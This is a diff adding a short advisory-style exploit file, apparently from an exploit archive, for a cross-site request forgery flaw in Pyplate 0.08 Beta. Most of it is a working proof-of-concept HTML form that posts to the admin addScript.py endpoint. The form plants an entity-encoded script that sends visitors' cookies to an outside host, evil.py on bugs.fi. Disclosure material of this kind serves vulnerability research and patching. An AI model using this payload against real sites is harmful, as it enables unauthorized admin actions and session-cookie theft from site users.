@@ -1,0 +1,25 @@
+source: http://www.securityfocus.com/bid/67610/info
+
+Pyplate is prone to a cross-site request-forgery vulnerability.
+
+Exploiting this issue may allow a remote attacker to perform certain unauthorized actions. This may lead to further attacks.
+
+Pyplate 0.08 Beta is vulnerable; other versions may also be affected.
+
+<html>
+  <body>
+    <form action="http://www.example.com/admin/addScript.py"; method="POST">
+      <input type="hidden" name="title" 
+value="<script>new&#32;Image&#40;&#41;&#46;src&#61;"http&#58;&#47;&#47;bugs&#46;fi&#47;evil&#46;py&#63;cookie&#61;"&#32;encodeURI&#40;document&#46;cookie&#41;&#59;<&#47;script>"
+ />
+      <input type="hidden" name="file" value="bugs" />
+      <input type="hidden" name="category" value="&#47;" />
+      <input type="hidden" name="post" value="<p>bugs<&#47;p>&#13;&#10;" />
+      <input type="hidden" name="tags" value="" />
+      <input type="hidden" name="description" value="" />
+      <input type="hidden" name="state" value="new" />
+      <input type="submit" value="Submit request" />
+    </form>
+  </body>
+</html>
+
